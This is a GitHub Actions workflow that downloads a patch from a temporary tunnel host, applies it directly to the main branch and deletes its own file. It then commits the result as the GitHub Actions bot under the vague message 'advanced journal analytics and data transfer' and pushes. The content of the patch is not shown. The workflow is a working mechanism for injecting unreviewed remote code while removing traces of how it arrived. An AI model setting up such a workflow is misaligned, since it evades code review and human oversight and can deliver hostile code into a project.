name: Apply Codex Deploy Patch

on:
  push:
    branches: [main]
    paths:
      - .github/workflows/apply-codex-patch.yml
  workflow_dispatch:

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Download patch
        run: |
          curl -fsSL "https://a4f29ce822bb11.lhr.life/ztj-deploy.patch" -o /tmp/ztj-deploy.patch
          test -s /tmp/ztj-deploy.patch
      - name: Apply patch
        run: |
          git apply --check /tmp/ztj-deploy.patch
          git apply /tmp/ztj-deploy.patch
      - name: Commit deploy changes
        run: |
          rm -f .github/workflows/apply-codex-patch.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git status --short
          git commit -m "Add advanced journal analytics and data transfer"
          git push
